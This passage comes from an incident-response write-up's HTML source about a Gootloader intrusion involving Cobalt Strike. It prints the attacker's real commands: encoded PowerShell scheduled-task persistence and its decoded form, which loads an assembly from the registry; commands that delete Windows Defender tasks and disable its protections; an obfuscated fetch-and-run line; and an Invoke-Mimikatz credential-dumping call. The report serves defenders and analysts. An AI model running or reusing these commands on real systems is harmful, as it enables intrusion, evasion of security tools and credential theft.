https://thedfirreport.com/wp-content/uploads/2022/05/11462-09-1024x107.png 1024w, https://thedfirreport.com/wp-content/uploads/2022/05/11462-09-768x80.png 768w, https://thedfirreport.com/wp-content/uploads/2022/05/11462-09-1536x160.png 1536w" sizes="(max-width: 1815px) 100vw, 1815px" /></noscript></a></div>
<div data-block-id="block-78527750-1e74-4ce1-b7de-fc8ebc6ab38c">&nbsp;</div>
<div class="ql-block" data-block-id="block-2b2a25df-f20e-4031-9465-5c4d84acdd9f">
<div class="ql-block" data-block-id="block-07368fc9-6e03-411e-aca1-0f398ece6bdc">The encoded PowerShell command creates a Scheduled Task that executes when the selected user logs on to the computer. An encoded PowerShell command is executed that will retrieve and execute the payload stored in the Registry.</div>
<div data-block-id="block-07368fc9-6e03-411e-aca1-0f398ece6bdc">&nbsp;</div>
<pre>6876813;
$a="NgAxADQANgA0ADkAMgAxADEAOwBzAGwAZQBlAHAAIAAtAHMAIAA4ADMAOwAkAG8AcABqAD0ARwBlAHQALQBJAHQAZQBtAFAAcgBvAHAAZQByAHQAeQAgAC0AcABhAHQAaAAgACgAIgBoAGsAIgArACIAYwB1ADoAXABzAG8AZgAiACsAIgB0AHcAIgArACIAYQByAGUAXABtAGkAYwAiACsAIgByAG8AcwAiACsAIgBvAGYAdABcAFAAaABvAG4AZQBcACIAKwBbAEUAbgB2AGkAcgBvAG4AbQBlAG4AdABdADoAOgAoACIAdQBzAGUAIgArACIAcgBuACIAKwAiAGEAbQBlACIAKQArACIAMAAiACkAOwBmAG8AcgAgACgAJAB1AG8APQAwADsAJAB1AG8AIAAtAGwAZQAgADcANgAwADsAJAB1AG8AKwArACkAewBUAHIAeQB7ACQAbQBwAGQAKwA9ACQAbwBwAGoALgAkAHUAbwB9AEMAYQB0AGMAaAB7AH0AfQA7ACQAdQBvAD0AMAA7AHcAaABpAGwAZQAoACQAdAByAHUAZQApAHsAJAB1AG8AKwArADsAJABrAG8APQBbAG0AYQB0AGgAXQA6ADoAKAAiAHMAcQAiACsAIgByAHQAIgApACgAJAB1AG8AKQA7AGkAZgAoACQAawBvACAALQBlAHEAIAAxADAAMAAwACkAewBiAHIAZQBhAGsAfQB9ACQAeQBsAD0AJABtAHAAZAAuAHIAZQBwAGwAYQBjAGUAKAAiACMAIgAsACQAawBvACkAOwAkAGsAagBiAD0AWwBiAHkAdABlAFsAXQBdADoAOgAoACIAbgBlACIAKwAiAHcAIgApACgAJAB5AGwALgBMAGUAbgBnAHQAaAAvADIAKQA7AGYAbwByACgAJAB1AG8APQAwADsAJAB1AG8AIAAtAGwAdAAgACQAeQBsAC4ATABlAG4AZwB0AGgAOwAkAHUAbwArAD0AMgApAHsAJABrAGoAYgBbACQAdQBvAC8AMgBdAD0AWwBjAG8AbgB2AGUAcgB0AF0AOgA6ACgAIgBUAG8AQgAiACsAIgB5AHQAZQAiACkAKAAkAHkAbAAuAFMAdQBiAHMAdAByAGkAbgBnACgAJAB1AG8ALAAyACkALAAoADIAKgA4ACkAKQB9AFsAcgBlAGYAbABlAGMAdABpAG8AbgAuAGEAcwBzAGUAbQBiAGwAeQBdADoAOgAoACIATABvACIAKwAiAGEAZAAiACkAKAAkAGsAagBiACkAOwBbAE8AcABlAG4AXQA6ADoAKAAiAFQAZQAiACsAIgBzAHQAIgApACgAKQA7ADYAMQAxADgAOQA4ADUANAA0ADsA";


$u=$env:USERNAME;
Register-ScheduledTask $u -In (New-ScheduledTask -Ac (New-ScheduledTaskAction -E ([Diagnostics.Process]::GetCurrentProcess().MainModule.FileName) -Ar ("-w h -e "+$a)) -Tr (New-ScheduledTaskTrigger -AtL -U $u));


30687851</pre>
<div class="ql-block" data-block-id="block-eef7c5e2-bc63-45d6-a7be-1e2257f3e893"><strong>Decoded PowerShell Payload:</strong></div>
<pre>6876813;
614649211;
$a = "614649211";
sleep - s 83;
$opj = Get - ItemProperty - path("hkcu:\software\microsoft\Phone\""+[Environment]::(" username ")+" 0 ");
 for ($uo = 0; $uo - le 760; $uo ++) {
  Try {
    $mpd += $opj.$uo
  }
  Catch {}
};
$uo = 0;
while ($true) {
  $uo ++;
  $ko = [math]::("sqrt")($uo);
  if ($ko - eq 1000) {
    break
  }
}
$yl = $mpd.replace("#", $ko);
$kjb = [byte[]]::("new")($yl.Length / 2);
for ($uo = 0; $uo - lt $yl.Length; $uo += 2) {
  $kjb[$uo / 2] = [convert]::("ToByte")($yl.Substring($uo, 2), (2 * 8))
}[reflection.assembly]::("Load")($kjb);
[Open]::("Test")();
611898544;
$u = $env : USERNAME;
Register - ScheduledTask $u - In(New - ScheduledTask - Ac(New - ScheduledTaskAction - E([Diagnostics.Process]::GetCurrentProcess().MainModule.FileName) - Ar("-w h -e " + $a)) - Tr(New - ScheduledTaskTrigger - AtL - U $u));
306878516;</pre>
</div>
<div class="ql-block" data-block-id="block-2b2a25df-f20e-4031-9465-5c4d84acdd9f"><br>
<div class="ql-block" data-block-id="block-e25172c5-40c3-4c58-9a92-6ab69c045435">The task created from the PowerShell script:</div>
<div data-block-id="block-e25172c5-40c3-4c58-9a92-6ab69c045435">&nbsp;</div>
<div class="ql-block" data-block-id="block-83083342-acff-4d3a-8ed9-7981a1971ad6"><a href="https://thedfirreport.com/wp-content/uploads/2022/05/11462-10.png"><img loading="lazy" class="aligncenter size-full wp-image-6761 jetpack-lazy-image" src="https://thedfirreport.com/wp-content/uploads/2022/05/11462-10.png" alt="" width="856" height="826" data-lazy-srcset="https://thedfirreport.com/wp-content/uploads/2022/05/11462-10.png 856w, https://thedfirreport.com/wp-content/uploads/2022/05/11462-10-300x289.png 300w, https://thedfirreport.com/wp-content/uploads/2022/05/11462-10-768x741.png 768w" data-lazy-sizes="(max-width: 856px) 100vw, 856px" data-lazy-src="https://thedfirreport.com/wp-content/uploads/2022/05/11462-10.png?is-pending-load=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><noscript><img loading="lazy" class="aligncenter size-full wp-image-6761" src="https://thedfirreport.com/wp-content/uploads/2022/05/11462-10.png" alt="" width="856" height="826" srcset="https://thedfirreport.com/wp-content/uploads/2022/05/11462-10.png 856w, https://thedfirreport.com/wp-content/uploads/2022/05/11462-10-300x289.png 300w, https://thedfirreport.com/wp-content/uploads/2022/05/11462-10-768x741.png 768w" sizes="(max-width: 856px) 100vw, 856px" /></noscript></a></div>
<div data-block-id="block-83083342-acff-4d3a-8ed9-7981a1971ad6">&nbsp;</div>
<h2 class="ql-heading" data-block-id="block-b6f1213e-fbe7-4480-a136-11b97dcb968d">Defense Evasion</h2>
<div class="ql-block" data-block-id="block-89a6186e-2100-4a71-88f2-0f1c9435eba9">
<div class="ql-block" data-block-id="block-f33f6e71-9a28-4ac7-9d46-bcae57e03023"><span class="ql-comment" data-comment-ids="774850429" data-comment-unresolved-ids="">Windows Defender scheduled scans were deleted from the system.</span> This was observed on multiple servers the threat actor pivoted to.</div>
<div data-block-id="block-f33f6e71-9a28-4ac7-9d46-bcae57e03023">&nbsp;</div>
<div class="ql-block" data-block-id="block-212bf61a-1096-4f29-8410-3cd6073df2e2"><a href="https://thedfirreport.com/wp-content/uploads/2022/05/11462-11.png"><img loading="lazy" class="aligncenter size-full wp-image-6762 jetpack-lazy-image" src="https://thedfirreport.com/wp-content/uploads/2022/05/11462-11.png" alt="" width="1050" height="442" data-lazy-srcset="https://thedfirreport.com/wp-content/uploads/2022/05/11462-11.png 1050w, https://thedfirreport.com/wp-content/uploads/2022/05/11462-11-300x126.png 300w, https://thedfirreport.com/wp-content/uploads/2022/05/11462-11-1024x431.png 1024w, https://thedfirreport.com/wp-content/uploads/2022/05/11462-11-768x323.png 768w" data-lazy-sizes="(max-width: 1050px) 100vw, 1050px" data-lazy-src="https://thedfirreport.com/wp-content/uploads/2022/05/11462-11.png?is-pending-load=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><noscript><img loading="lazy" class="aligncenter size-full wp-image-6762" src="https://thedfirreport.com/wp-content/uploads/2022/05/11462-11.png" alt="" width="1050" height="442" srcset="https://thedfirreport.com/wp-content/uploads/2022/05/11462-11.png 1050w, https://thedfirreport.com/wp-content/uploads/2022/05/11462-11-300x126.png 300w, https://thedfirreport.com/wp-content/uploads/2022/05/11462-11-1024x431.png 1024w, https://thedfirreport.com/wp-content/uploads/2022/05/11462-11-768x323.png 768w" sizes="(max-width: 1050px) 100vw, 1050px" /></noscript></a></div>
<div data-block-id="block-212bf61a-1096-4f29-8410-3cd6073df2e2">&nbsp;</div>
<pre>schtasks /delete /tn "\Microsoft\Windows\Windows Defender\Windows Defender Scheduled Scan" /f
schtasks /delete /tn "\Microsoft\Windows\Windows Defender\Windows Defender Cache Maintenance" /f
schtasks /delete /tn "\Microsoft\Windows\Windows Defender\Windows Defender Cleanup" /f
schtasks /delete /tn "\Microsoft\Windows\Windows Defender\Windows Defender Verification" /f</pre>
<div class="ql-block" data-block-id="block-993edfb2-545f-407e-b025-f39dda42d18d">
<div class="ql-block" data-block-id="block-4c3c229d-e793-41e6-8c99-8ec1bf64bb72">Furthermore, PowerShell was used to disable multiple security features built into Microsoft Defender.</div>
<div data-block-id="block-4c3c229d-e793-41e6-8c99-8ec1bf64bb72">&nbsp;</div>
<pre>Set-MpPreference -DisableRealtimeMonitoring $true
Set-MpPreference -DisableArchiveScanning $true
Set-MpPreference -DisableBehaviorMonitoring $true
Set-MpPreference -DisableIOAVProtection $true
Set-MpPreference -DisableIntrusionPreventionSystem $true
Set-MpPreference -DisableScanningNetworkFiles $true
Set-MpPreference -MAPSReporting 0
Set-MpPreference -DisableCatchupFullScan $True
Set-MpPreference -DisableCatchupQuickScan $True</pre>
<div class="ql-block" data-block-id="block-170df4fb-03c1-4fed-b954-b1803e32c250">As in many cases involving Cobalt Strike, we observed rundll32 used to load the Cobalt Strike beacons into memory on the beachhead host.</div>
<div data-block-id="block-170df4fb-03c1-4fed-b954-b1803e32c250">&nbsp;</div>
<div class="ql-block" data-block-id="block-f5a5e671-c16d-4171-9261-20d8af46cfbf"><a href="https://thedfirreport.com/wp-content/uploads/2022/05/11462-12.png"><img loading="lazy" class="aligncenter size-full wp-image-6763 jetpack-lazy-image" src="https://thedfirreport.com/wp-content/uploads/2022/05/11462-12.png" alt="" width="544" height="186" data-lazy-srcset="https://thedfirreport.com/wp-content/uploads/2022/05/11462-12.png 544w, https://thedfirreport.com/wp-content/uploads/2022/05/11462-12-300x103.png 300w" data-lazy-sizes="(max-width: 544px) 100vw, 544px" data-lazy-src="https://thedfirreport.com/wp-content/uploads/2022/05/11462-12.png?is-pending-load=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><noscript><img loading="lazy" class="aligncenter size-full wp-image-6763" src="https://thedfirreport.com/wp-content/uploads/2022/05/11462-12.png" alt="" width="544" height="186" srcset="https://thedfirreport.com/wp-content/uploads/2022/05/11462-12.png 544w, https://thedfirreport.com/wp-content/uploads/2022/05/11462-12-300x103.png 300w" sizes="(max-width: 544px) 100vw, 544px" /></noscript></a></div>
<div data-block-id="block-f5a5e671-c16d-4171-9261-20d8af46cfbf">&nbsp;</div>
<div class="ql-block" data-block-id="block-b292a8ca-bfd4-4c73-913b-c6fcc2c66d5a">This can be observed in the memory dump from the beachhead host with the tell-tale <code>PAGE_EXECUTE_READWRITE</code> protection settings on the memory space and MZ headers observable in the process memory space.</div>
<div data-block-id="block-b292a8ca-bfd4-4c73-913b-c6fcc2c66d5a">&nbsp;</div>
<div class="ql-block" data-block-id="block-aa3dedd5-9221-4e23-a737-65067794df0b"><a href="https://thedfirreport.com/wp-content/uploads/2022/05/11462-13.png"><img loading="lazy" class="aligncenter size-full wp-image-6764 jetpack-lazy-image" src="https://thedfirreport.com/wp-content/uploads/2022/05/11462-13.png" alt="" width="1031" height="1360" data-lazy-srcset="https://thedfirreport.com/wp-content/uploads/2022/05/11462-13.png 1031w, https://thedfirreport.com/wp-content/uploads/2022/05/11462-13-227x300.png 227w, https://thedfirreport.com/wp-content/uploads/2022/05/11462-13-776x1024.png 776w, https://thedfirreport.com/wp-content/uploads/2022/05/11462-13-768x1013.png 768w" data-lazy-sizes="(max-width: 1031px) 100vw, 1031px" data-lazy-src="https://thedfirreport.com/wp-content/uploads/2022/05/11462-13.png?is-pending-load=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><noscript><img loading="lazy" class="aligncenter size-full wp-image-6764" src="https://thedfirreport.com/wp-content/uploads/2022/05/11462-13.png" alt="" width="1031" height="1360" srcset="https://thedfirreport.com/wp-content/uploads/2022/05/11462-13.png 1031w, https://thedfirreport.com/wp-content/uploads/2022/05/11462-13-227x300.png 227w, https://thedfirreport.com/wp-content/uploads/2022/05/11462-13-776x1024.png 776w, https://thedfirreport.com/wp-content/uploads/2022/05/11462-13-768x1013.png 768w" sizes="(max-width: 1031px) 100vw, 1031px" /></noscript></a></div>
<div data-block-id="block-aa3dedd5-9221-4e23-a737-65067794df0b">&nbsp;</div>
<div class="ql-block" data-block-id="block-4972e12e-0531-49c1-afca-d6608b2044c4">During the intrusion we observed various named pipes utilized by the threat actor’s Cobalt Strike beacons including default Cobalt Strike named pipes.</div>
<div data-block-id="block-4972e12e-0531-49c1-afca-d6608b2044c4">&nbsp;</div>
<div class="ql-block" data-block-id="block-8041e920-14d5-4908-9059-970fcf8cda87"><a href="https://thedfirreport.com/wp-content/uploads/2022/05/11462-14.png"><img loading="lazy" class="aligncenter size-full wp-image-6765 jetpack-lazy-image" src="https://thedfirreport.com/wp-content/uploads/2022/05/11462-14.png" alt="" width="525" height="173" data-lazy-srcset="https://thedfirreport.com/wp-content/uploads/2022/05/11462-14.png 525w, https://thedfirreport.com/wp-content/uploads/2022/05/11462-14-300x99.png 300w" data-lazy-sizes="(max-width: 525px) 100vw, 525px" data-lazy-src="https://thedfirreport.com/wp-content/uploads/2022/05/11462-14.png?is-pending-load=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><noscript><img loading="lazy" class="aligncenter size-full wp-image-6765" src="https://thedfirreport.com/wp-content/uploads/2022/05/11462-14.png" alt="" width="525" height="173" srcset="https://thedfirreport.com/wp-content/uploads/2022/05/11462-14.png 525w, https://thedfirreport.com/wp-content/uploads/2022/05/11462-14-300x99.png 300w" sizes="(max-width: 525px) 100vw, 525px" /></noscript></a></div>
<div data-block-id="block-8041e920-14d5-4908-9059-970fcf8cda87">&nbsp;</div>
<pre>PipeName: \msagent_ld
PipeName: \1ea887</pre>
<div class="ql-block" data-block-id="block-77e1f22e-79bb-49be-a82e-434808e3b1a5">The threat actors were observed making use of double encoded Powershell commands. The first layer of encoding contains Hexadecimal and XOR encoding.</div>
<div data-block-id="block-77e1f22e-79bb-49be-a82e-434808e3b1a5">&nbsp;</div>
<div class="ql-block" data-block-id="block-3961d163-6132-4fce-a8d2-5893781ce316"><a href="https://thedfirreport.com/wp-content/uploads/2022/05/11462-15.png"><img loading="lazy" class="aligncenter size-full wp-image-6766 jetpack-lazy-image" src="https://thedfirreport.com/wp-content/uploads/2022/05/11462-15.png" alt="" width="2109" height="585" data-lazy-srcset="https://thedfirreport.com/wp-content/uploads/2022/05/11462-15.png 2109w, https://thedfirreport.com/wp-content/uploads/2022/05/11462-15-300x83.png 300w, https://thedfirreport.com/wp-content/uploads/2022/05/11462-15-1024x284.png 1024w, https://thedfirreport.com/wp-content/uploads/2022/05/11462-15-768x213.png 768w, https://thedfirreport.com/wp-content/uploads/2022/05/11462-15-1536x426.png 1536w, https://thedfirreport.com/wp-content/uploads/2022/05/11462-15-2048x568.png 2048w" data-lazy-sizes="(max-width: 2109px) 100vw, 2109px" data-lazy-src="https://thedfirreport.com/wp-content/uploads/2022/05/11462-15.png?is-pending-load=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><noscript><img loading="lazy" class="aligncenter size-full wp-image-6766" src="https://thedfirreport.com/wp-content/uploads/2022/05/11462-15.png" alt="" width="2109" height="585" srcset="https://thedfirreport.com/wp-content/uploads/2022/05/11462-15.png 2109w, https://thedfirreport.com/wp-content/uploads/2022/05/11462-15-300x83.png 300w, https://thedfirreport.com/wp-content/uploads/2022/05/11462-15-1024x284.png 1024w, https://thedfirreport.com/wp-content/uploads/2022/05/11462-15-768x213.png 768w, https://thedfirreport.com/wp-content/uploads/2022/05/11462-15-1536x426.png 1536w, https://thedfirreport.com/wp-content/uploads/2022/05/11462-15-2048x568.png 2048w" sizes="(max-width: 2109px) 100vw, 2109px" /></noscript></a></div>
<div class="ql-block" data-block-id="block-690bff70-47bb-4de2-abf0-ea6e7067034f"><span class="ql-comment" data-comment-ids="774850718" data-comment-unresolved-ids="">The second layer of encoding contains a Base64 encoded string resulting in Gunzipped data.</span></div>
<div data-block-id="block-690bff70-47bb-4de2-abf0-ea6e7067034f">&nbsp;</div>
<div class="ql-block" data-block-id="block-f1e02b40-ceff-4bae-bcfb-f42f005f5a5f"><a href="https://thedfirreport.com/wp-content/uploads/2022/05/11462-16.png"><img loading="lazy" class="aligncenter size-full wp-image-6767 jetpack-lazy-image" src="https://thedfirreport.com/wp-content/uploads/2022/05/11462-16.png" alt="" width="2331" height="1091" data-lazy-srcset="https://thedfirreport.com/wp-content/uploads/2022/05/11462-16.png 2331w, https://thedfirreport.com/wp-content/uploads/2022/05/11462-16-300x140.png 300w, https://thedfirreport.com/wp-content/uploads/2022/05/11462-16-1024x479.png 1024w, https://thedfirreport.com/wp-content/uploads/2022/05/11462-16-768x359.png 768w, https://thedfirreport.com/wp-content/uploads/2022/05/11462-16-1536x719.png 1536w, https://thedfirreport.com/wp-content/uploads/2022/05/11462-16-2048x959.png 2048w" data-lazy-sizes="(max-width: 2331px) 100vw, 2331px" data-lazy-src="https://thedfirreport.com/wp-content/uploads/2022/05/11462-16.png?is-pending-load=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><noscript><img loading="lazy" class="aligncenter size-full wp-image-6767" src="https://thedfirreport.com/wp-content/uploads/2022/05/11462-16.png" alt="" width="2331" height="1091" srcset="https://thedfirreport.com/wp-content/uploads/2022/05/11462-16.png 2331w, https://thedfirreport.com/wp-content/uploads/2022/05/11462-16-300x140.png 300w, https://thedfirreport.com/wp-content/uploads/2022/05/11462-16-1024x479.png 1024w, https://thedfirreport.com/wp-content/uploads/2022/05/11462-16-768x359.png 768w, https://thedfirreport.com/wp-content/uploads/2022/05/11462-16-1536x719.png 1536w, https://thedfirreport.com/wp-content/uploads/2022/05/11462-16-2048x959.png 2048w" sizes="(max-width: 2331px) 100vw, 2331px" /></noscript></a></div>
<div data-block-id="block-f1e02b40-ceff-4bae-bcfb-f42f005f5a5f">&nbsp;</div>
<div class="ql-block" data-block-id="block-1ce18297-6a62-4106-8f8f-e26090370df0">Decoding this script reveals that it is a publicly available <a class="ql-link" href="https://github.com/Kevin-Robertson/Invoke-TheHash/blob/master/Invoke-WMIExec.ps1" target="_blank" rel="noopener noreferrer">WMIExec script </a>for running remote WMI queries.</div>
<div data-block-id="block-1ce18297-6a62-4106-8f8f-e26090370df0">&nbsp;</div>
<div class="ql-block" data-block-id="block-dbf9595a-8f43-4fed-bfba-a3eac4f649e5"><a href="https://thedfirreport.com/wp-content/uploads/2022/05/11462-17.png"><img loading="lazy" class="aligncenter size-full wp-image-6768 jetpack-lazy-image" src="https://thedfirreport.com/wp-content/uploads/2022/05/11462-17.png" alt="" width="1718" height="1214" data-lazy-srcset="https://thedfirreport.com/wp-content/uploads/2022/05/11462-17.png 1718w, https://thedfirreport.com/wp-content/uploads/2022/05/11462-17-300x212.png 300w, https://thedfirreport.com/wp-content/uploads/2022/05/11462-17-1024x724.png 1024w, https://thedfirreport.com/wp-content/uploads/2022/05/11462-17-768x543.png 768w, https://thedfirreport.com/wp-content/uploads/2022/05/11462-17-1536x1085.png 1536w" data-lazy-sizes="(max-width: 1718px) 100vw, 1718px" data-lazy-src="https://thedfirreport.com/wp-content/uploads/2022/05/11462-17.png?is-pending-load=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><noscript><img loading="lazy" class="aligncenter size-full wp-image-6768" src="https://thedfirreport.com/wp-content/uploads/2022/05/11462-17.png" alt="" width="1718" height="1214" srcset="https://thedfirreport.com/wp-content/uploads/2022/05/11462-17.png 1718w, https://thedfirreport.com/wp-content/uploads/2022/05/11462-17-300x212.png 300w, https://thedfirreport.com/wp-content/uploads/2022/05/11462-17-1024x724.png 1024w, https://thedfirreport.com/wp-content/uploads/2022/05/11462-17-768x543.png 768w, https://thedfirreport.com/wp-content/uploads/2022/05/11462-17-1536x1085.png 1536w" sizes="(max-width: 1718px) 100vw, 1718px" /></noscript></a></div>
<div data-block-id="block-dbf9595a-8f43-4fed-bfba-a3eac4f649e5">&nbsp;</div>
<div class="ql-block" data-block-id="block-0b182b7c-1d3e-41d8-9083-a25fdb192158">
<h2 class="ql-heading" data-block-id="block-ae77f7c1-b00c-4ad1-bbb2-2159f0da6506">Credential Access</h2>
<div class="ql-block" data-block-id="block-506e8fb1-8023-42b5-9497-67a7d8c82e0b">The malicious PowerShell process used by Gootloader dropped a PowerShell script named “mi.ps1” on the file system.</div>
<div data-block-id="block-506e8fb1-8023-42b5-9497-67a7d8c82e0b">&nbsp;</div>
<div class="ql-block" data-block-id="block-758ae420-ac1a-4c63-9179-cf89a113a339">
<div class="ql-block" data-block-id="block-703bf541-e8e7-4121-9727-e1262b9c0cd9"><a href="https://thedfirreport.com/wp-content/uploads/2022/05/11462-18.png"><img loading="lazy" class="aligncenter size-full wp-image-6769 jetpack-lazy-image" src="https://thedfirreport.com/wp-content/uploads/2022/05/11462-18.png" alt="" width="1688" height="78" data-lazy-srcset="https://thedfirreport.com/wp-content/uploads/2022/05/11462-18.png 1688w, https://thedfirreport.com/wp-content/uploads/2022/05/11462-18-300x14.png 300w, https://thedfirreport.com/wp-content/uploads/2022/05/11462-18-1024x47.png 1024w, https://thedfirreport.com/wp-content/uploads/2022/05/11462-18-768x35.png 768w, https://thedfirreport.com/wp-content/uploads/2022/05/11462-18-1536x71.png 1536w" data-lazy-sizes="(max-width: 1688px) 100vw, 1688px" data-lazy-src="https://thedfirreport.com/wp-content/uploads/2022/05/11462-18.png?is-pending-load=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><noscript><img loading="lazy" class="aligncenter size-full wp-image-6769" src="https://thedfirreport.com/wp-content/uploads/2022/05/11462-18.png" alt="" width="1688" height="78" srcset="https://thedfirreport.com/wp-content/uploads/2022/05/11462-18.png 1688w, https://thedfirreport.com/wp-content/uploads/2022/05/11462-18-300x14.png 300w, https://thedfirreport.com/wp-content/uploads/2022/05/11462-18-1024x47.png 1024w, https://thedfirreport.com/wp-content/uploads/2022/05/11462-18-768x35.png 768w, https://thedfirreport.com/wp-content/uploads/2022/05/11462-18-1536x71.png 1536w" sizes="(max-width: 1688px) 100vw, 1688px" /></noscript></a></div>
<div data-block-id="block-703bf541-e8e7-4121-9727-e1262b9c0cd9">&nbsp;</div>
<div class="ql-block" data-block-id="block-b060a9c4-3c73-4190-bd94-2d7fab0258a4"><span class="ql-comment" data-comment-ids="774851620" data-comment-unresolved-ids="">Another PowerShell command was used to trigger the mi.ps1 script. The script was using XOR-encoding.</span></div>
<div data-block-id="block-b060a9c4-3c73-4190-bd94-2d7fab0258a4">&nbsp;</div>
<div class="ql-block" data-block-id="block-03fcef47-48d4-436e-b01a-5fc112063b43">
<div class="ql-block" data-block-id="block-b62e6cf4-2114-48a7-9302-d75e69e00411"><a href="https://thedfirreport.com/wp-content/uploads/2022/05/11462-19.png"><img loading="lazy" class="aligncenter size-full wp-image-6770 jetpack-lazy-image" src="https://thedfirreport.com/wp-content/uploads/2022/05/11462-19.png" alt="" width="1598" height="155" data-lazy-srcset="https://thedfirreport.com/wp-content/uploads/2022/05/11462-19.png 1598w, https://thedfirreport.com/wp-content/uploads/2022/05/11462-19-300x29.png 300w, https://thedfirreport.com/wp-content/uploads/2022/05/11462-19-1024x99.png 1024w, https://thedfirreport.com/wp-content/uploads/2022/05/11462-19-768x74.png 768w, https://thedfirreport.com/wp-content/uploads/2022/05/11462-19-1536x149.png 1536w" data-lazy-sizes="(max-width: 1598px) 100vw, 1598px" data-lazy-src="https://thedfirreport.com/wp-content/uploads/2022/05/11462-19.png?is-pending-load=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><noscript><img loading="lazy" class="aligncenter size-full wp-image-6770" src="https://thedfirreport.com/wp-content/uploads/2022/05/11462-19.png" alt="" width="1598" height="155" srcset="https://thedfirreport.com/wp-content/uploads/2022/05/11462-19.png 1598w, https://thedfirreport.com/wp-content/uploads/2022/05/11462-19-300x29.png 300w, https://thedfirreport.com/wp-content/uploads/2022/05/11462-19-1024x99.png 1024w, https://thedfirreport.com/wp-content/uploads/2022/05/11462-19-768x74.png 768w, https://thedfirreport.com/wp-content/uploads/2022/05/11462-19-1536x149.png 1536w" sizes="(max-width: 1598px) 100vw, 1598px" /></noscript></a></div>
<pre>powershell -nop -noni -ep bypass -w h -c ""$t=([type]'Convert');&amp;([scriptblock]::Create(($t::(($t.GetMethods()|?{$_.Name-clike'F*g'}).Name)('NWYsOV90Zjxec3t0cmUxX3RlP0Z0c1J9eHR/ZTgqNWQsNWY/OTk5OTVmOD9BYl5ze3RyZT9cdGV5fnViOG0uajlYZXR8MUdwY3hwc310K044P0dwfWR0P19wfHQ8cn14enQ2VTt2Nmw4P19wfHQ4P1h/Z356dDk2eWVlYSs+PiAjJj8hPyE/ICskJiYhIj42OCo3OVVYQzFQfXhwYis+WDtJODk1ZDgqMVh8YX5jZTxcfnVkfXQxUitNRGJ0Y2JNaGRieXA/fH5ifXRoTVh/Z356dDxGXFhUaXRyP2FiICoxWH9nfnp0PEZcWFRpdHIxPEVwY3Z0ZTFCWVBDVCAxPFV+fHB4fzFhY354f2JkY3B/cnQ/fX5ycH0xPERidGN/cHx0MVh/YmVwfX10YzE8WXBieTF0IyF0KSByJHIhJ3JydyMpKSUmJXIkKSB3ICIlIyJzKDE8Un58fHB/dTEzYX5mdGNieXR9fT90aXQxX3RmPFhldHxBY35hdGNlaDE8QXBleTE2WVpdXCtNQmhiZXR8TVJkY2N0f2VSfn9lY359QnRlTVJ+f2Vjfn1NXWJwNjE8X3B8dDE2VXhicHN9dEN0YmVjeHJldHVQdXx4fzYxPEdwfWR0MSExPEFjfmF0Y2VoRWhhdDFVRl5DVTMxPGd0Y3N+YnQ=')|%{$_-bxor17}|%{[char]$_})-join''))""</pre>
<div class="ql-block" data-block-id="block-ff6352bb-32be-4955-9b58-61aa0e716362">
<div class="ql-block" data-block-id="block-d56f6390-e281-464e-89b5-6b9ba3a6fa52">
<div class="ql-block" data-block-id="block-5c35b7f1-d2c4-40f8-a06c-166d85f82a33"><a href="https://github.com/The-DFIR-Report/cyberchef-recipes/blob/main/SEO%20Poisoning%20-%20A%20GootLoader%20Story" target="_blank" rel="noopener">This</a> CyberChef recipe can be used to decode the inner encoded command.</div>
<div class="ql-block" data-block-id="block-a16467b8-6d5e-45ea-a820-9c8fc6d0f765">
<div data-block-id="block-405c8b1e-e1a5-4b73-9f99-f34be0c2f494">&nbsp;</div>
<div class="ql-block" data-block-id="block-405c8b1e-e1a5-4b73-9f99-f34be0c2f494">The output lists “Invoke-Mimikatz”, a direct reference to the PowerShell Invoke-Mimikatz.ps1 script used to load Mimikatz DLL directly in memory.</div>
<div data-block-id="block-405c8b1e-e1a5-4b73-9f99-f34be0c2f494">&nbsp;</div>
<div class="ql-block" data-block-id="block-73eca8fc-9caf-423f-9c6a-149cb2ea9343">
<pre>$u=('http://127.0.0.1:22201/'|%{(IRM $_)});$u|&amp;(GCM I*e-E*); Import-Module C:\Users\&lt;redacted&gt;\mi.ps1; Invoke-Mimikatz -ComputerName &lt;redacted&gt;</pre>
<div class="ql-block" data-block-id="block-fdfdb789-4eea-4f96-a894-e6af8f62530f">Monitoring PowerShell event id 4103 we can observe the threat actor’s successful credential access activity from the Mimikatz invocation.</div>
<div data-block-id="block-fdfdb789-4eea-4f96-a894-e6af8f62530f">&nbsp;</div>
<div class="ql-block" data-block-id="block-d3d42ad6-0076-4c6d-adf4-7a256d632414"><a href="https://thedfirreport.com/wp-content/uploads/2022/05/11462-20.png"><img loading="lazy" class="aligncenter size-full wp-image-6771 jetpack-lazy-image" src="https://thedfirreport.com/wp-content/uploads/2022/05/11462-20.png" alt="" width="1202" height="876" data-lazy-srcset="https://thedfirreport.com/wp-content/uploads/2022/05/11462-20.png 1202w, https://thedfirreport.com/wp-content/uploads/2022/05/11462-20-300x219.png 300w, https://thedfirreport.com/wp-content/uploads/2022/05/11462-20-1024x746.png 1024w, https://thedfirreport.com/wp-content/uploads/2022/05/11462-20-768x560.png 768w" data-lazy-sizes="(max-width: 1202px) 100vw, 1202px" data-lazy-src="https://thedfirreport.com/wp-content/uploads/2022/05/11462-20.png?is-pending-load=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><noscript><img loading="lazy" class="aligncenter size-full wp-image-6771" 